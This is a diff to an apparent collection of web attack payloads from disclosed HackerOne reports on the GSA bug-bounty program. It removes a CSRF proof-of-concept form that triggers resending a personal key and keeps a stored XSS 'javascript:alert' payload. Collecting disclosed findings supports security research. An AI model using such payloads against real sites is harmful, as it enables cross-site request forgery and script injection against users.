@@ -1,6 +1,6 @@
 # GSA Bounty
 
-11 payloads.
+10 payloads.
 
 ### `802104e7`
 
@@ -19,22 +19,6 @@ javascript:alert(document.domain);
 
 **Parameter:** `customDomain`
 — [Double Stored Cross-Site scripting in the admin panel](https://hackerone.com/reports/245172) · GSA Bounty · [sp1d3rs](https://hackerone.com/sp1d3rs)
-
-### `40581d20`
-
-```
-<html>
-  <body>
-  <script>history.pushState('', '', '/')</script>
-    <form action="https://target.com/manage/personal_key">
-      <input type="hidden" name="resend" value="true" />
-      <input type="submit" value="Submit request" />
-    </form>
-  </body>
-</html>
-```
-
-— [CSRF in generating a new Personal Key](https://hackerone.com/reports/263512) · GSA Bounty · [streaak](https://hackerone.com/streaak)
 
 ### `1b7f372d`
 
